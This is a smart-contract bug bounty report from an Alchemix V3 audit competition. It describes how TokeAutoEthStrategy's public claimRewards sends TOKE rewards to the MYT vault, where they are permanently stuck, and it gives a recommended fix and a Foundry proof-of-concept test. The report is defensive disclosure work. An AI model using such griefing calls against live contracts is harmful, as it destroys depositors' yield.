# 57621 sc low improper reward claiming in tokeautoethstrategy sends toke tokens to wrong address causing permanent freezing of unclaimed yield

**Submitted on Oct 27th 2025 at 17:03:23 UTC by @terrah for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57621
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>
* **Impacts:**
  * Permanent freezing of unclaimed yield

## Description

## Bug Description

The \_claimRewards function in TokeAutoEthStrategy.sol incorrectly sends TOKE reward tokens directly to the MYT vault address instead of to the strategy contract itself. Since the MYT vault only handles WETH shares and has no mechanism to recover or process TOKE tokens, these rewards become permanently stuck and unrecoverable.

The vulnerable function is publicly callable without access control, allowing anyone to trigger this loss at any time.

```solidity
function _claimRewards() internal override returns (uint256 rewardsClaimed) {
    rewardsClaimed = rewarder.earned(address(this));
    rewarder.getReward(address(this), address(MYT), false);
}
```

The function calls getReward with address(MYT) as the recipient parameter, which causes the Tokemak rewarder to send TOKE tokens to the MYT vault contract. The MYT vault (a Morpho V2 Vault) expects only WETH as its underlying asset and has no functionality to handle or recover alternative tokens like TOKE.

Furthermore, the public claimRewards function has inadequate access control, only checking killSwitch status but allowing any address to call it.

```solidity
function claimRewards() public virtual returns (uint256) {
    require(!killSwitch, "emergency");
    _claimRewards();
}
```

## Impact

This vulnerability results in permanent freezing of unclaimed yield. TOKE rewards earned from staking autoETH shares in the Tokemak rewarder represent unclaimed yield that belongs to strategy depositors. When these rewards are sent to the MYT vault, they become permanently inaccessible because the MYT vault only accounts for its underlying WETH asset in totalAssets calculations and has no rescue mechanism for non-underlying tokens.

The economic impact scales with the strategy's TVL and the TOKE reward APY. For example, with $1M TVL earning 5% APY in TOKE rewards, approximately $50,000 worth of TOKE would be permanently frozen annually. Any attacker can execute this attack at zero cost by simply calling the public claimRewards function, making it a viable griefing vector that causes continuous value loss to protocol users.

This qualifies as permanent freezing of unclaimed yield under the HIGH severity category because the TOKE rewards are yield meant for depositors but become permanently inaccessible when sent to an incompatible contract.

## Risk Breakdown

Difficulty to Exploit: TRIVIAL

The attack requires a single function call with no prerequisites, capital requirements, or special permissions. The attacker does not need to be a strategy depositor or have any tokens. They simply call claimRewards() on the strategy contract and the rewards are immediately sent to the wrong address where they become stuck forever.

## Recommendation

Modify \_claimRewards to send TOKE tokens to the strategy contract itself, then implement logic to either swap them to WETH or distribute them appropriately. The corrected implementation should be:

```solidity
function _claimRewards() internal override returns (uint256 rewardsClaimed) {
    rewardsClaimed = rewarder.earned(address(this));
    rewarder.getReward(address(this), address(this), false);
    // Add logic to swap TOKE to WETH or handle properly
}
```

Additionally, restrict claimRewards access to whitelisted allocators or strategy owner to prevent griefing attacks.

```solidity
function claimRewards() public virtual returns (uint256) {
    require(whitelistedAllocators[msg.sender] || msg.sender == owner(), "PD");
    require(!killSwitch, "emergency");
    _claimRewards();
}
```

## References

TokeAutoEth.sol MYTStrategy.sol

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "../../src/test/libraries/BaseStrategyTest.sol";
import {TokeAutoEthStrategy} from "../../src/strategies/mainnet/TokeAutoEth.sol";
import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IMainRewarder} from "../../src/strategies/interfaces/ITokemac.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";

contract MockRewarder {
    address public rewardToken;
    uint256 public rewardAmount;
    address public lastAccount;
    address public lastRecipient;
    bool public lastClaimExtras;

    constructor(address _rewardToken) {
        rewardToken = _rewardToken;
    }

    function setRewardAmount(uint256 amount) external {
        rewardAmount = amount;
    }

    function earned(address) external view returns (uint256) {
        return rewardAmount;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 1000e18;
    }

    function getReward(address account, address recipient, bool claimExtras) external {
        lastAccount = account;
        lastRecipient = recipient;
        lastClaimExtras = claimExtras;

        if (rewardAmount > 0) {
            IERC20(rewardToken).transfer(recipient, rewardAmount);
        }
    }

    function stake(address, uint256) external {}
    function withdraw(address, uint256, bool) external {}
}

contract MockTokeAutoEthStrategy is TokeAutoEthStrategy {
    constructor(
        address _myt,
        StrategyParams memory _params,
        address _autoEth,
        address _router,
        address _rewarder,
        address _weth,
        address _oracle,
        address _permit2Address
    ) TokeAutoEthStrategy(_myt, _params, _autoEth, _router, _rewarder, _weth, _oracle, _permit2Address) {}
}

contract Poc008WrongRewardRecipientTest is BaseStrategyTest {
    address public constant TOKE_AUTO_ETH_VAULT = 0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant MAINNET_PERMIT2 = 0x000000000022d473030f1dF7Fa9381e04776c7c5;
    address public constant AUTOPILOT_ROUTER = 0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21;
    address public constant ORACLE = 0x61F8BE7FD721e80C0249829eaE6f0DAf21bc2CaC;
    address public constant TOKE_TOKEN = 0x2e9d63788249371f1DFC918a52f8d799F4a38C94;

    MockRewarder public mockRewarder;

    function getStrategyConfig() internal pure override returns (IMYTStrategy.StrategyParams memory) {
        return IMYTStrategy.StrategyParams({
            owner: address(1),
            name: "TokeAutoEth",
            protocol: "TokeAutoEth",
            riskClass: IMYTStrategy.RiskClass.MEDIUM,
            cap: 10_000e18,
            globalCap: 1e18,
            estimatedYield: 100e18,
            additionalIncentives: false,
            slippageBPS: 1
        });
    }

    function getTestConfig() internal pure override returns (TestConfig memory) {
        return TestConfig({vaultAsset: WETH, vaultInitialDeposit: 1000e18, absoluteCap: 10_000e18, relativeCap: 1e18, decimals: 18});
    }

    function createStrategy(address _vault, IMYTStrategy.StrategyParams memory params) internal override returns (address) {
        mockRewarder = new MockRewarder(TOKE_TOKEN);
        return address(new MockTokeAutoEthStrategy(_vault, params, TOKE_AUTO_ETH_VAULT, AUTOPILOT_ROUTER, address(mockRewarder), WETH, ORACLE, MAINNET_PERMIT2));
    }

    function getForkBlockNumber() internal pure override returns (uint256) {
        return 22_089_302;
    }

    function getRpcUrl() internal view override returns (string memory) {
        return vm.envString("MAINNET_RPC_URL");
    }

    function testWrongRewardRecipient() public {
        uint256 rewardAmount = 100e18;

        deal(TOKE_TOKEN, address(mockRewarder), rewardAmount);
        mockRewarder.setRewardAmount(rewardAmount);

        uint256 earnedRewards = mockRewarder.earned(strategy);
        assertEq(earnedRewards, rewardAmount, "1) PROOF: Strategy has rewards in rewarder");

        uint256 vaultTokeBalanceBefore = IERC20(TOKE_TOKEN).balanceOf(vault);
        uint256 strategyTokeBalanceBefore = IERC20(TOKE_TOKEN).balanceOf(strategy);
        assertEq(vaultTokeBalanceBefore, 0, "Vault starts with 0 TOKE");
        assertEq(strategyTokeBalanceBefore, 0, "Strategy starts with 0 TOKE");

        IMYTStrategy(strategy).claimRewards();

        uint256 vaultTokeBalanceAfter = IERC20(TOKE_TOKEN).balanceOf(vault);
        uint256 strategyTokeBalanceAfter = IERC20(TOKE_TOKEN).balanceOf(strategy);

        assertEq(mockRewarder.lastAccount(), strategy, "2) PROOF: getReward called for strategy account");
        assertEq(mockRewarder.lastRecipient(), vault, "BUG: getReward recipient is VAULT (should be strategy)");
        assertNotEq(mockRewarder.lastRecipient(), strategy, "BUG: Recipient is NOT strategy");

        assertEq(vaultTokeBalanceAfter, rewardAmount, "3) PROOF: TOKE tokens went to MYT vault");
        assertEq(strategyTokeBalanceAfter, 0, "4) PROOF: TOKE tokens NOT in strategy (stayed at 0)");

        uint256 vaultTotalAssets = IVaultV2(vault).totalAssets();
        assertEq(vaultTotalAssets, testConfig.vaultInitialDeposit, "5) PROOF: TOKE not accounted in vault totalAssets - permanently stuck");
    }
}

```
